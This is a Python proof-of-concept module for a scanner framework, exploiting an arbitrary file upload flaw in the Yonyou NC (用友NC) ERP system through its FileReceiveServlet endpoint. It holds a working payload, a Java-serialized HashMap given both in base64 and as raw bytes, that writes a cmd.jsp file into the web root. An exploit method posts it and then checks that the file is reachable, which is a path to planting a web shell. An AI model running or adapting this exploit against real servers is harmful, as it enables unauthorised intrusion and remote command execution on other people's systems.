import uuid
from PocUtils import PocType, Severity
from PocUtils.Http import Http
from urllib.parse import urljoin


class Poc:
    def __init__(self):
        self.poc_type = PocType.http
        self.target = ""
        self.severity = Severity.critical
        self.detail = """用友nc的这个路径是可以直接文件上传：`/servlet/~uapss/com.yonyou.ante.servlet.FileReceiveServlet`

payload：

```python
header = {
"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
"Content-Type": "multipart/form-data;",
"Referer": "https://google.com"
}
data = b"wqzDrQAFc3IAEWphdmEudXRpbC5IYXNoTWFwBQfDmsOBw4MWYMORAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAACdAAJRklMRV9OQU1FdAAHY21kLmpzcHQAEFRBUkdFVF9GSUxFX1BBVEh0ABAuL3dlYmFwcHMvbmNfd2VieA=="
shell = \"\"\"
[shell]
\"\"\"
requests.post("https://target:port/servlet/~uapss/com.yonyou.ante.servlet.FileReceiveServlet", headers=header, verify=False, data=base64.b64decode(b).decode()+shell, timeout=25)
```

"""
        self.name = "用友nc文件上传漏洞"

    def check(self):
        client = Http()
        client.url = self.target
        resp = client.get()
        if "Application" in resp.text and "platform/nc" in resp.text:
            return True
        else:
            return False

    def exploit(self):
        data = "\xac\xed\x00\x05\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48\x61\x73\x68\x4d\x61\x70\x05\x07\xda\xc1\xc3\x16\x60\xd1\x03\x00\x02\x46\x00\x0a\x6c\x6f\x61\x64\x46\x61\x63\x74\x6f\x72\x49\x00\x09\x74\x68\x72\x65\x73\x68\x6f\x6c\x64\x78\x70\x3f\x40\x00\x00\x00\x00\x00\x0c\x77\x08\x00\x00\x00\x10\x00\x00\x00\x02\x74\x00\x09\x46\x49\x4c\x45\x5f\x4e\x41\x4d\x45\x74\x00\x07\x63\x6d\x64\x2e\x6a\x73\x70\x74\x00\x10\x54\x41\x52\x47\x45\x54\x5f\x46\x49\x4c\x45\x5f\x50\x41\x54\x48\x74\x00\x10\x2e\x2f\x77\x65\x62\x61\x70\x70\x73\x2f\x6e\x63\x5f\x77\x65\x62\x78"
        header = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
        "Content-Type": "multipart/form-data;",
        "Referer": "https://google.com"
        }
        token = uuid.uuid4().hex
        client = Http()
        client.url = urljoin(self.target, "/servlet/~uapss/com.yonyou.ante.servlet.FileReceiveServlet")
        client.headers = header
        client.data = (data + token)
        client.post()
        verify = Http()
        verify.url = urljoin(self.target, "/cmd.jsp")
        v_resp = verify.get()
        if token in v_resp.text:
            return True
        else:
            return False
